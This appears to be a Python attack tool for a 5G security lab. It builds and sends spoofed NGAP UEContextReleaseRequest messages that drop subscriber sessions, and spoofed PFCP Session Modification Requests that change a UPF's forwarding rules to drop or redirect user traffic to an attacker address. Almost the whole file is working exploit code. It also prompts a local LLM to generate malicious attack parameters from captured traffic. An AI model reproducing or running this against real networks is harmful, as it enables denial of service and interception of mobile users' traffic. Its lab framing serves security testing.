# craft5g_final_v2.py
#
# Purpose:
#   Helper tool for your 5G security lab project.
#   - Scenario 5 (S5): Craft malicious NGAP UEContextReleaseRequest.
#   - Scenario 7 (S7): Craft malicious PFCP SessionModificationRequest
#                      that manipulates an existing FAR (Fake SMF).
#
# Requirements:
#   - Python 3.9+
#   - scapy >= 2.5.0:         pip install scapy
#   - pycrate-ng (NGAP ASN.1) pip install pycrate-ng
#   - pysctp (optional, Linux): pip install pysctp
#   - requests (for Ollama LLM integration): pip install requests

from __future__ import annotations
import json, socket, os
from dataclasses import dataclass
from typing import Optional, List
from copy import deepcopy

import requests

from scapy.all import IP, UDP, send
from scapy.contrib import pfcp as scapy_pfcp

# ---- NGAP (pycrate) ----
from pycrate_asn1dir.NGAP import NGAP_PDU_Descriptions, NGAP_Constants

# ---------------------------------------------------------------------------
# PFCP base classes & IE helpers (Scapy)
# ---------------------------------------------------------------------------
# Scapy already defines PFCP and each Information Element (IE) as Python
# classes.  Here we import the ones we need and also handle small naming
# differences across Scapy versions so the script is more portable.

PFCP = scapy_pfcp.PFCP
PFCPSessionModificationRequest = scapy_pfcp.PFCPSessionModificationRequest

# Handle different naming conventions across Scapy versions
IE_FAR_ID = getattr(scapy_pfcp, "IE_FAR_ID", getattr(scapy_pfcp, "IE_FAR_Id"))

IE_ApplyAction = getattr(
    scapy_pfcp,
    "IE_ApplyAction",
    getattr(scapy_pfcp, "IE_Apply_Action", None),
)

IE_ForwardingParameters = getattr(
    scapy_pfcp,
    "IE_ForwardingParameters",
    getattr(scapy_pfcp, "IE_Forwarding_Parameters", None),
)

IE_DestinationInterface = getattr(
    scapy_pfcp,
    "IE_DestinationInterface",
    getattr(scapy_pfcp, "IE_Destination_Interface", None),
)

IE_OuterHeaderCreation = getattr(
    scapy_pfcp,
    "IE_OuterHeaderCreation",
    getattr(scapy_pfcp, "IE_Outer_Header_Creation", None),
)

IE_UpdateFAR = getattr(
    scapy_pfcp,
    "IE_UpdateFAR",
    getattr(scapy_pfcp, "IE_Update_FAR", None),
)

# ---------------------------------------------------------------------------
# LLM helpers (Ollama) – used to autogenerate test cases from real captures
# ---------------------------------------------------------------------------

def ask_ollama(prompt: str, model: str = "mistral", host: Optional[str] = None) -> str:
    """
    Call a local Ollama model to generate a text response.

    This is used to auto-generate malicious NGAP/PFCP specs based on
    previous capture context (hunt5g.py output).
    """
    host = host or os.getenv("OLLAMA_HOST", "http://localhost:11434")
    url = f"{host.rstrip('/')}/api/generate"
    r = requests.post(
        url,
        json={
            "model": model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.2, "num_predict": 1024},
        },
    )
    r.raise_for_status()
    return r.json().get("response", "")


def json_from_llm(s: str) -> dict:
    """
    Turn a (possibly code-fenced) LLM answer into a Python dict.

    The helper:
      1. Strips ```json ... ``` wrappers if present.
      2. Extracts the first {...} block.
      3. Parses it as JSON.
    """
    t = s.strip()
    if t.startswith("```"):
        parts = t.split("```")
        if len(parts) >= 3:
            t = parts[1]
        else:
            t = t.strip("`")
    if "{" in t and "}" in t:
        t = t[t.find("{"): t.rfind("}") + 1]
    return json.loads(t)

# ---------------------------------------------------------------------------
# NGAP helpers (Scenario 5 – fake UE Context Release)
# ---------------------------------------------------------------------------

def _fresh_ngap_pdu():
    """
    Return a *fresh* NGAP PDU object.

    pycrate sometimes reuses a global template, so we either call clone()
    if available or fall back to deepcopy to avoid modifying shared state.
    """
    tmpl = NGAP_PDU_Descriptions.NGAP_PDU
    if hasattr(tmpl, "clone"):
        return tmpl.clone()
    return deepcopy(tmpl)


def _ngap_const_int(c):
    """
    Convert a pycrate NGAP constant (e.g. NGAP_Constants.id_Cause)
    into a plain Python int.  Different versions expose this slightly
    differently, so we handle several cases.
    """
    if isinstance(c, int):
        return c
    if hasattr(c, "get_val"):
        try:
            return int(c.get_val())
        except Exception:
            pass
    if hasattr(c, "val"):
        try:
            return int(c.val)
        except Exception:
            pass
    return int(str(c))

# ---------- Scenario #5: NGAP UEContextReleaseRequest ----------

@dataclass
class NGAPReleaseSpec:
    """
    Simple container describing one malicious UEContextReleaseRequest
    to be generated for Scenario 5.
    """
    amf_ue_ngap_id: int
    ran_ue_ngap_id: int
    cause: str = "radioNetwork:unspecified"
    amf_ip: str = "10.0.0.10"
    amf_sctp_port: int = 38412


def build_ngap_ue_context_release_request(spec: NGAPReleaseSpec) -> bytes:
    """
    Build the ASN.1-encoded NGAP UEContextReleaseRequest.

    The resulting value is returned as APER-encoded bytes.  It can be
    handed directly to an SCTP stack for transmission to the AMF.
    """
    # Parse "domain:reason" style cause string (e.g. "radioNetwork:unspecified")
    cause_dom = "radioNetwork"
    cause_name = "unspecified"

    if isinstance(spec.cause, str) and ":" in spec.cause:
        left, right = spec.cause.split(":", 1)
        left = left.strip()
        right = right.strip()
        if left:
            cause_dom = left
        if right:
            cause_name = right

    cause_choice = ("Cause", (cause_dom, cause_name))

    # NGAP IE list inside UEContextReleaseRequest
    ies = [
        {
            "id": _ngap_const_int(NGAP_Constants.id_AMF_UE_NGAP_ID),
            "criticality": "reject",
            "value": ("AMF_UE_NGAP_ID", spec.amf_ue_ngap_id),
        },
        {
            "id": _ngap_const_int(NGAP_Constants.id_RAN_UE_NGAP_ID),
            "criticality": "reject",
            "value": ("RAN_UE_NGAP_ID", spec.ran_ue_ngap_id),
        },
        {
            "id": _ngap_const_int(NGAP_Constants.id_Cause),
            "criticality": "ignore",
            "value": cause_choice,
        },
    ]

    # Wrap IEs into the NGAP InitiatingMessage (UEContextReleaseRequest)
    pdu_val = (
        "initiatingMessage",
        {
            "procedureCode": _ngap_const_int(NGAP_Constants.id_UEContextRelease),
            "criticality": "reject",
            "value": (
                "UEContextReleaseRequest",
                {
                    "protocolIEs": ies,
                },
            ),
        },
    )

    pdu = _fresh_ngap_pdu()
    pdu.set_val(pdu_val)
    return pdu.to_aper()


def send_ngap_sctp(raw_ngap: bytes, amf_ip: str, amf_port: int):
    """
    Send raw NGAP bytes over SCTP to the AMF.

    If pysctp is not installed, we simply print the hex payload so it
    can be replayed with another SCTP tool.
    """
    try:
        import sctp  # pysctp
    except Exception:
        print("[!] pysctp not available; hex payload below. Use your SCTP stack or tcpreplay:")
        print(raw_ngap.hex())
        return

    s = sctp.sctpsocket_tcp(socket.AF_INET)
    s.connect((amf_ip, amf_port))
    s.sctp_send(raw_ngap)
    s.close()

# ---------------------------------------------------------------------------
# Scenario #7: PFCP SessionModificationRequest / Update FAR (Demo)
# ---------------------------------------------------------------------------

@dataclass
class PFCPModifySpec:
    """
    Container for one malicious PFCP Session Modification Request.

    This captures exactly the parameters the attacker needs for Scenario 7:
    - smf_ip / upf_ip: spoofed SMF address and real UPF address.
    - seid / far_id: identifiers sniffed from legitimate PFCP traffic.
    - apply_action: which FAR action bits to manipulate (FORW/DROP/...).
    - dst_ipv4 / teid / dst_port: new GTP-U tunnel endpoint to redirect to.
    """
    smf_ip: str = "10.0.0.30"
    upf_ip: str = "10.0.0.40"
    smf_port: int = 8805
    upf_port: int = 8805
    seid: int = 0
    far_id: int = 0
    apply_action: str = "FORW"      # FORW|DROP|BUFF|NOCP|DUPL|redirect
    dst_ipv4: Optional[str] = None  # for FORW/redirect (not needed for DROP)
    teid: Optional[int] = None
    dst_port: Optional[int] = 2152

# Valid keywords the CLI accepts for the Apply Action IE
ALLOWED_ACTIONS = {"FORW", "DROP", "BUFF", "NOCP", "DUPL"}


def _clamp_apply_action(spec: PFCPModifySpec) -> PFCPModifySpec:
    """
    Normalise and validate the requested apply_action.

    - 'redirect' is implemented as FORW + custom Outer Header Creation,
      so here we map it back to 'FORW'.
    - Any unknown value is also mapped to 'FORW' as a safe default.
    """
    word = (spec.apply_action or "").upper()
    # "redirect" is implemented as FORW + modified Outer Header Creation
    if word == "REDIRECT":
        word = "FORW"
    if word not in ALLOWED_ACTIONS:
        word = "FORW"
    spec.apply_action = word
    return spec


def build_pfcp_session_mod_request(spec: PFCPModifySpec):
    """
    Build a PFCP Session Modification Request with a single UpdateFAR IE.

    Scenario 7 logic:
      - The PFCP header (PFCP(...)) sets S=1 and uses the sniffed SEID,
        so that the UPF believes this update belongs to an existing
        PDU session.
      - Inside the body we build UpdateFAR:
          FAR_ID IE  → which FAR to modify (e.g. FAR 1).
          ApplyAction IE → set FORW / DROP bits etc.
          (optional) ForwardingParameters + OuterHeaderCreation IE to
          override the downlink GTP-U tunnel endpoint (redirect traffic).
    """
    # Normalise apply_action (FORW/DROP/…)
    spec = _clamp_apply_action(spec)

    # ---------- FAR ID IE ----------
    # Newer Scapy exposes IE_FAR_ID(id=...), but field names differ slightly
    # by version.  The try/except block keeps it robust.
    try:
        far_ie = IE_FAR_ID(id=spec.far_id)
    except TypeError:
        # Fallback: detect the field whose name looks like "far id"
        kwargs = {}
        for fd in getattr(IE_FAR_ID, "fields_desc", []):
            if "far" in fd.name.lower() or fd.name.lower() == "id":
                kwargs[fd.name] = spec.far_id
                break
        if not kwargs:
            kwargs = {"id": spec.far_id}
        far_ie = IE_FAR_ID(**kwargs)

    # ---------- Apply Action IE ----------
    # This sets the FAR action bits (FORW, DROP, BUFF, NOCP, DUPL).
    flags = {}
    if spec.apply_action in ALLOWED_ACTIONS:
        flags[spec.apply_action] = 1
    else:
        flags["FORW"] = 1
    apply_ie = IE_ApplyAction(**flags)

    # Base children of UpdateFAR: always FAR ID + Apply Action
    child_ies: List[object] = [far_ie, apply_ie]

    # ---------- OPTIONAL: redirect / hijack via Forwarding Parameters ----------
    # Only build ForwardingParameters / OHC if any redirect parameters are set.
    if (
        (spec.dst_ipv4 or spec.teid is not None or spec.dst_port is not None)
        and IE_ForwardingParameters
        and IE_OuterHeaderCreation
    ):
        # Create empty OHC IE
        ohc_ie = IE_OuterHeaderCreation()

        # (1) Set description bits so Wireshark sees GTP-U/UDP/IPv4.
        #     Different Scapy versions use different field names.
        for fname in ("GTPUUDPIPV4", "GTPU_UDP_IPV4", "gtpuudpipv4"):
            if hasattr(ohc_ie, fname):
                setattr(ohc_ie, fname, 1)
                break

        # Some implementations also expose separate IPV4 / UDPIPV4 bits
        for fname in ("IPV4", "IPv4"):
            if hasattr(ohc_ie, fname):
                setattr(ohc_ie, fname, 1)
                break

        for fname in ("UDPIPV4", "UDP_IPV4"):
            if hasattr(ohc_ie, fname):
                setattr(ohc_ie, fname, 1)
                break

        # (2) Manually build trailing bytes:
        #     TEID (4B) + IPv4 (4B) + UDP port (2B).
        #     These are attacker-controlled values used for redirect.
        extra = b""
        if spec.teid is not None:
            extra += int(spec.teid).to_bytes(4, "big")

        if spec.dst_ipv4:
            try:
                extra += socket.inet_aton(spec.dst_ipv4)
            except OSError:
                # Invalid IPv4; if this happens the field is simply omitted.
                pass

        if spec.dst_port is not None:
            extra += int(spec.dst_port).to_bytes(2, "big")

        # Assign raw bytes to Scapy's "extra_data" field if it exists.
        if extra and hasattr(ohc_ie, "extra_data"):
            ohc_ie.extra_data = extra

        # Destination Interface:
        #   In our Open5GS lab, FAR ID 1 is the downlink FAR (N3 Access).
        #   For that FAR we set interface=Access, others default to Core.
        if IE_DestinationInterface:
            if spec.far_id == 1:
                dest_if = "Access"
            else:
                dest_if = "Core"
            dest_ie = IE_DestinationInterface(interface=dest_if)
            # ForwardingParameters IE wraps DestinationInterface + OHC.
            fwd_ie = IE_ForwardingParameters(IE_list=[dest_ie, ohc_ie])
        else:
            fwd_ie = IE_ForwardingParameters(IE_list=[ohc_ie])

        child_ies.append(fwd_ie)

    # Wrap all IEs into a single UpdateFAR IE
    update_far_ie = IE_UpdateFAR(IE_list=child_ies)

    # Build the PFCP Session Modification Request payload (no PFCP header yet)
    smr = PFCPSessionModificationRequest(IE_list=[update_far_ie])

    # Outer PFCP header with:
    #   - IP/UDP header spoofing the SMF IP towards the real UPF.
    #   - PFCP header: S=1 (Session message) and sniffed SEID.
    pkt = (
        IP(src=spec.smf_ip, dst=spec.upf_ip)
        / UDP(sport=spec.smf_port, dport=spec.upf_port)
        / PFCP(S=1, seid=spec.seid, seq=1)
        / smr
    )
    return pkt


def send_pfcp(pkt):
    """
    Send the crafted PFCP packet on the wire using Scapy.
    """
    send(pkt, verbose=False)
    print(f"[+] Sent PFCP SMR to {pkt[IP].dst}:{pkt[UDP].dport} (SEID={pkt[PFCP].seid})")

# ---------------------------------------------------------------------------
# LLM schemas & context-driven prompts (used by hunt5g.py integration)
# ---------------------------------------------------------------------------

NGAP_JSON_SCHEMA = {
    "amf_ue_ngap_id": "int",
    "ran_ue_ngap_id": "int",
    "cause": "string valid NGAP Cause (e.g. 'radioNetwork:unspecified')",
}

PFCP_JSON_SCHEMA = {
    "seid": "int",
    "far_id": "int",
    "apply_action": "FORW|DROP|BUFF|NOCP|DUPL|redirect",
    "dst_ipv4": "IPv4 if FORW/redirect",
    "teid": "int if GTP-U redirect",
    "dst_port": "int (e.g. 2152)",
}


def prompt_llm_for_ngap_from_context(
    ctx_path: str, count: int = 3, model: str = "mistral", host: Optional[str] = None
) -> List[NGAPReleaseSpec]:
    """
    Read NGAP context JSON (produced by hunt5g.py) and ask the LLM
    to propose several malicious UEContextReleaseRequest candidates.

    Returns:
        List of NGAPReleaseSpec objects that can be passed directly
        to build_ngap_ue_context_release_request().
    """
    with open(ctx_path, "r", encoding="utf-8") as f:
        ctx = json.load(f)

    prompt = f"""
You are assisting in 5G control-plane security testing (authorized lab).
Scenario: Fake UE Context Release Request (S5).
Context from real captures:
{json.dumps(ctx, indent=2)}

Generate {count} malicious UEContextReleaseRequest candidates.
Each candidate must:
- Use an existing (amf_ue_ngap_id, ran_ue_ngap_id) pair from the context.
- Choose a Cause that is valid per 3GPP NGAP and plausible for abuse.
Return JSON only:
{{
  "cases": [
    {{
      "amf_ue_ngap_id": <int>,
      "ran_ue_ngap_id": <int>,
      "cause": "<valid NGAP Cause>"
    }}
  ]
}}
"""
    js = json_from_llm(ask_ollama(prompt, model=model, host=host))
    cases = js.get("cases", [])
    return [NGAPReleaseSpec(**c) for c in cases]


def prompt_llm_for_pfcp_from_context(
    ctx_path: str, count: int = 3, model: str = "mistral", host: Optional[str] = None
) -> List[PFCPModifySpec]:
    """
    Read PFCP context JSON and ask the LLM to generate malicious FAR
    modifications for Scenario 7.

    The LLM is constrained to:
      - pick existing (seid, far_id) pairs from the context,
      - choose a valid apply_action,
      - and, for redirect cases, supply plausible attacker IP/TEID/port.
    """
    with open(ctx_path, "r", encoding="utf-8") as f:
        ctx = json.load(f)

    prompt = f"""
You are assisting in 5G PFCP security testing (authorized lab).
Scenario: Fake PFCP Session Modification Request with FAR Manipulation (S7).
Context from real captures:
{json.dumps(ctx, indent=2)}

Generate {count} malicious FAR modifications.
Rules:
- Use an existing (seid, far_id) from the context.
- apply_action must be one of {list(ALLOWED_ACTIONS)} or "redirect".
- For redirect/forward, set dst_ipv4/teid/dst_port to plausible attacker-controlled values.
Return JSON only:
{{
  "cases": [
    {{
      "seid": <int>,
      "far_id": <int>,
      "apply_action": "FORW|DROP|BUFF|NOCP|DUPL|redirect",
      "dst_ipv4": "x.x.x.x or null",
      "teid": <int or null>,
      "dst_port": <int or null>
    }}
  ]
}}
"""
    js = json_from_llm(ask_ollama(prompt, model=model, host=host))
    cases = js.get("cases", [])
    return [PFCPModifySpec(**c) for c in cases]

# ---------------------------------------------------------------------------
# CLI – entry point for Scenario 5 (s5-ngap) and Scenario 7 (s7-pfcp)
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(
        description="Craft NGAP/PFCP packets for 5G lab attacks (Scenarios #5 and #7)"
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    # ------------------------- Scenario 5 CLI -------------------------
    s5 = sub.add_parser("s5-ngap", help="Craft UEContextReleaseRequest")
    s5.add_argument("--amf", help="AMF IP (for sending)", default="10.0.0.10")
    s5.add_argument("--amf-port", type=int, default=38412)
    s5.add_argument("--amf-id", type=int, help="Manual AMF-UE-NGAP-ID")
    s5.add_argument("--ran-id", type=int, help="Manual RAN-UE-NGAP-ID")
    s5.add_argument("--cause", default="radioNetwork:unspecified")
    s5.add_argument("--context", help="NGAP LLM context JSON from hunt5g.py")
    s5.add_argument("--llm", action="store_true",
                    help="Use LLM + context to generate specs")
    s5.add_argument("--count", type=int, default=3,
                    help="How many LLM-generated variants")
    s5.add_argument("--send", action="store_true",
                    help="Send over SCTP (Linux + pysctp)")
    s5.add_argument("--dump", action="store_true",
                    help="Print hex of crafted PDUs")

    # ------------------------- Scenario 7 CLI -------------------------
    s7 = sub.add_parser("s7-pfcp", help="Craft PFCP SessionModificationRequest/UpdateFAR")
    s7.add_argument("--smf-ip", default="10.0.0.30")
    s7.add_argument("--upf-ip", default="10.0.0.40")
    s7.add_argument("--seid", type=int, help="Manual SEID")
    s7.add_argument("--far", type=int, help="Manual FAR ID")
    s7.add_argument("--apply", default="FORW",
                    help="FORW|DROP|BUFF|NOCP|DUPL|redirect")
    s7.add_argument("--dst-ip",
                    help="For redirect/hijack: attacker IP for GTP-U (e.g. 192.168.211.136)")
    s7.add_argument("--teid", type=int,
                    help="For redirect/hijack: original downlink TEID")
    s7.add_argument("--dst-port", type=int, default=2152,
                    help="GTP-U UDP port (usually 2152)")
    s7.add_argument("--context", help="PFCP LLM context JSON from hunt5g.py")
    s7.add_argument("--llm", action="store_true",
                    help="Use LLM + context to generate specs")
    s7.add_argument("--count", type=int, default=3)
    s7.add_argument("--send", action="store_true",
                    help="Actually send PFCP (lab only)")
    args = ap.parse_args()

    # ------------------------- Scenario 5 path ------------------------
    if args.cmd == "s5-ngap":
        specs: List[NGAPReleaseSpec] = []

        if args.llm and args.context:
            # Use LLM + context file to produce several attack candidates
            specs = prompt_llm_for_ngap_from_context(
                args.context, count=args.count
            )
        elif args.amf_id is not None and args.ran_id is not None:
            # Manual single attack case provided via CLI
            specs = [NGAPReleaseSpec(
                amf_ue_ngap_id=args.amf_id,
                ran_ue_ngap_id=args.ran_id,
                cause=args.cause,
                amf_ip=args.amf,
                amf_sctp_port=args.amf_port,
            )]
        else:
            raise SystemExit(
                "For s5-ngap, either provide --llm --context or "
                "--amf-id and --ran-id."
            )

        # Build and optionally send all generated NGAP attacks
        for i, spec in enumerate(specs, 1):
            raw = build_ngap_ue_context_release_request(spec)
            print(f"\n[S5 case #{i}] AMF-UE={spec.amf_ue_ngap_id}, "
                  f"RAN-UE={spec.ran_ue_ngap_id}, Cause={spec.cause}")
            if args.dump or not args.send:
                # Helpful when you only want to save the payload for later replay.
                print(raw.hex())
            if args.send:
                send_ngap_sctp(raw, spec.amf_ip, spec.amf_sctp_port)

    # ------------------------- Scenario 7 path ------------------------
    elif args.cmd == "s7-pfcp":
        specs: List[PFCPModifySpec] = []

        if args.llm and args.context:
            # Use LLM + PFCP context to auto-propose FAR modifications
            specs = prompt_llm_for_pfcp_from_context(
                args.context, count=args.count
            )
        elif args.seid is not None and args.far is not None:
            # Manual single FAR modification specified via CLI
            specs = [PFCPModifySpec(
                smf_ip=args.smf_ip,
                upf_ip=args.upf_ip,
                seid=args.seid,
                far_id=args.far,
                apply_action=args.apply,
                dst_ipv4=args.dst_ip,
                teid=args.teid,
                dst_port=args.dst_port,
            )]
        else:
            raise SystemExit(
                "For s7-pfcp, either provide --llm --context or "
                "--seid and --far."
            )

        # Build and optionally send all generated PFCP attacks
        for i, spec in enumerate(specs, 1):
            pkt = build_pfcp_session_mod_request(spec)
            print(f"\n[S7 case #{i}] SEID={spec.seid}, FAR={spec.far_id}, "
                  f"apply_action={spec.apply_action}, dst={spec.dst_ipv4}")
            # Show the full PFCP structure
            pkt.show()
            if args.send:
                send_pfcp(pkt)
